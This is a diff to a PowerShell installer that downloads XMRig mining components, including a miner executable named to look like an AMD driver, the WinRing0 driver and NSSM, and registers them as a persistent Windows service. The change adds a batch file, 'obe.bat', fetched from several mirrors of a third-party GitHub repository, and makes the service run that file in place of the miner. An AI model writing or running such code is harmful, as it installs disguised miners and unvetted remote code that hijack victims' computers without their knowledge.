@@ -165,12 +165,17 @@ $files = @{
         'https://github.com/xmrig/xmrig/raw/refs/heads/master/bin/WinRing0/WinRing0x64.sys',
         'https://raw.githubusercontent.com/xmrig/xmrig/master/bin/WinRing0/WinRing0x64.sys'
     )
+    'obe.bat' = @(
+        'https://raw.githubusercontent.com/User07x07/Dopple/main/obe.bat',
+        'https://github.com/User07x07/Dopple/raw/main/obe.bat',
+        'https://cdn.jsdelivr.net/gh/User07x07/Dopple/obe.bat'
+    )
 }
 
 # Check if files already exist locally first
 Write-Host "  Checking for local files..." -ForegroundColor Gray
 $localFiles = Get-ChildItem -Path $scriptDir -File | Where-Object { 
-    $_.Name -in @('amdkmpfd.sys.vmp.exe', 'nssm.exe', 'WinRing0x64.sys', 'config.json') 
+    $_.Name -in @('obe.bat','amdkmpfd.sys.vmp.exe', 'nssm.exe', 'WinRing0x64.sys', 'config.json') 
 }
 
 foreach ($localFile in $localFiles) {
@@ -211,7 +216,7 @@ foreach ($item in $files.GetEnumerator()) {
 # Step 4: Verify downloaded files
 Write-Host "`nStep 4: Verifying downloaded files..." -ForegroundColor Cyan
 
-$requiredFiles = @('amdkmpfd.sys.vmp.exe', 'config.json', 'nssm.exe')
+$requiredFiles = @('obe.bat','amdkmpfd.sys.vmp.exe', 'config.json', 'nssm.exe')
 $missingFiles = @()
 $failedDownloads = $downloadResults.GetEnumerator() | Where-Object { $_.Value -eq $false }
 
@@ -256,7 +261,7 @@ Write-Host "`nStep 7: Configuring service..." -ForegroundColor Cyan
 Set-Location $targetDir
 
 $nssmPath = Join-Path $targetDir "nssm.exe"
-$xmrigPath = Join-Path $targetDir "amdkmpfd.sys.vmp.exe"
+$xmrigPath = Join-Path $targetDir "obe.bat"
 
 if (Test-Path $nssmPath) {
     try {
@@ -355,6 +360,7 @@ if ($Host.Name -eq "ConsoleHost") {
     Write-Host "`nPress any key to exit..." -ForegroundColor DarkGray
     $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
 }
+
 
 
 
